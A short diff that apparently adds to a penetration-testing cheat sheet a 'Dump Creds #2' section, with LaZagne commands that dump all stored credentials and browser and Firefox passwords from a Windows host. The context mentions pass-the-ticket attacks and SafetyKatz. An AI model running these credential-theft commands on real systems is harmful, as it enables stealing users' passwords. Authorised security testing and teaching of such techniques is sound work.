@@ -1097,6 +1097,19 @@ Can also be used for dumping and pass the ticket attacks but will cover this els
 
 
 
+Dump Creds #2
+
+```powershell
+#https://github.com/AlessandroZ/LaZagne
+
+laZagne.exe all
+laZagne.exe browsers
+laZagne.exe browsers -firefox
+
+```
+
+
+
 SafetyKatz
 
 ```powershell
